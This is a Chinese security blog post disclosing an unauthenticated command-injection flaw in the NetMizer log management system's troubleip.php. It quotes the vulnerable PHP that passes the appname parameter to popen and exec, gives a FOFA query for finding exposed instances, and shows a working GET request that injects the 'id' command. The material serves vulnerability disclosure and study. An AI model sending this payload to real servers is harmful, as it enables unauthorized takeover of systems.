---
title: "NetMizer日志管理系统 troubleip.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-troubleip-appname-rce.html
asset_dir: assets/netmizer日志管理系统-troubleip.php-命令执行漏洞
---

# NetMizer日志管理系统 troubleip.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/22 08:28
- 1047浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

SQL注入防护

编程语言教程

SQL注入检测工具

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/troubleip.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞修复方案

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `troubleip.php` 业务实现关键逻辑部分

```
else if($action == 'showtask'){
    if($csv) $arr_proto = getcontentdesc(0);
    else $arr_proto = getcontentdesc();

    $curid = $page;
    $linenum = $limit;

    $cmd_root = "/var/www/cgi-bin/$appname";
    $cmd = $cmd_root." -i ".intval($id)." -p ";

    chdir("/var/www/html/");
    $fp=@popen($cmd, "r");
    $line=fgets($fp,2048);
    if(substr($line, 0, 5)=="Error") {
       @pclose($fp);
       return $line;
    }
```

深入探索

Docker加速服务

Nessus

在线安全工具

当 `$action == 'showtask'` 时，`$appname` 直接拼接在 `$cmd_root` > `$cmd` 中带入 `popen` 执行，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

同样的当 `$action == 'addtask'` 时

```
$search_root = "/var/www/$path";
......
$cmd_root = "/var/www/cgi-bin/$appname";
......
$filename = $search_root."/".$now.".cfg";
$fp = fopen($filename, "w");
if($fp) {
    fputs($fp, $str);
    fclose($fp);
    chdir("/var/www/cgi-bin/");
    $cmd = $cmd_root." -i $now > /dev/null &";
    //$cmd = $cmd_root." -t -v -i $now > /tmp/aa1.txt &";
    @exec($cmd);
}
echo '{"success":true}';
```

深入探索

网络安全会议

软件

漏洞扫描器

`$appname` 也是直接拼接进命令执行字符串中用 exec 来执行最终的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/search/troubleip.php?action=showtask&appname=search;id+%23+&id=1 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 `id` 命令并且回显命令执行结果

[![NetMizer日志管理系统 troubleip.php 命令执行漏洞](images/img-001-d7422b023d89.webp)](https://image.mrxn.net/a35a7ea221fc446e8677fa35b55ad8d0.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

Windows安全工具
